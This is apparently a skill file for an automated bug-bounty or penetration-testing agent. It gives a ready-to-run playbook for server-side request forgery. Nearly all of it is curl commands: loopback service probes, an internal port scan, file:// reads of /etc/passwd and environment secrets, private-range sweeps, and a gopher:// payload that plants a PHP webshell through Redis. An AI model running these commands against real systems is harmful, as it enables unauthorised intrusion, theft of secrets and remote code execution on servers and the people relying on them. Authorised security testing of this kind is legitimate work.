---
name: attack-ssrf-classic
description: "Classic SSRF — internal network access, loopback services, internal port scanning, file:// reads, gopher protocol smuggling"
category: "web-application"
version: "1.0"
author: "bountyreper-official"
tags:
  - ssrf
  - internal
  - ports
  - gopher
tech_stack:
  - web
cwe_ids:
  - CWE-918
chains_with:
  - attack-ssrf
  - attack-ssrf-filter-bypass
prerequisites:
  - attack-ssrf
---

# Classic SSRF

## Objective

Make the server fetch attacker-chosen targets on its own network — loopback services,
internal hosts, `file://` reads, and protocol smuggles (gopher).

## Methodology

### 1. Loopback + common internal services

```bash
# Loopback services often unauthenticated from localhost
curl "https://TARGET/fetch?url=http://127.0.0.1:80/"
curl "https://TARGET/fetch?url=http://localhost:8080/"
curl "https://TARGET/fetch?url=http://127.0.0.1:6379/"   # Redis
curl "https://TARGET/fetch?url=http://127.0.0.1:9200/"   # Elasticsearch
curl "https://TARGET/fetch?url=http://127.0.0.1:11211/"  # memcached
```

### 2. Internal port scan (response-status oracle)

```bash
for port in 80 443 8080 8443 3306 5432 6379 27017 9200 11211; do
  curl -s -o /dev/null -w "%{http_code} " "https://TARGET/fetch?url=http://127.0.0.1:$port/" &
done; wait
# open vs closed ports return different statuses/errors → port map
```

### 3. file:// reads

```bash
curl "https://TARGET/fetch?url=file:///etc/passwd"
curl "https://TARGET/fetch?url=file:///etc/hosts"     # reveals internal naming
curl "https://TARGET/fetch?url=file:///proc/self/environ"  # secrets in env vars
curl "https://TARGET/fetch?url=file:///proc/net/tcp"  # listening internal services
```

### 4. gopher:// protocol smuggling (dumb SSRF → protocol client)

```bash
# Redis: flush + write webshell + save
curl "https://TARGET/fetch?url=gopher://127.0.0.1:6379/_%0D%0Aset%20pwn%20%22%3C%3Fphp%20system(%24_GET%5B0%5D)%3F%3E%22%0D%0Aconfig%20set%20dir%20%2Fvar%2Fwww%2Fhtml%0D%0Aconfig%20set%20dbfilename%20shell.php%0D%0Asave"
# FastCGI, SMTP, MySQL also speak gopher — craft raw protocol frames
```

### 5. Private-range sweep (when the first hit is blind)

```bash
# 10.0.0.0/8 sweep via status/timing oracle, batched
for ip in 10.0.0.1 10.0.1.1 10.1.0.1 192.168.1.1 172.16.0.1; do
  curl -s -o /dev/null -w "$ip %{http_code}\n" "https://TARGET/fetch?url=http://$ip/" &
done; wait
```

## Proof requirements

- Response body showing internal content (banner, passwd, JSON from internal API) — or
- Protocol interaction evidence (gopher commands visible in Redis/CGI logs)
- Map what you reached: host:port, service version → feeds attack-ssti/attack-xxe chains

## Notes

- `http://[::ffff:127.0.0.1]/` IPv4-mapped IPv6 escapes naive IPv4 checks — also in filter-bypass
- If every loopback target is blocked, the fetcher likely runs with its own proxy — check filter-bypass sub-skill
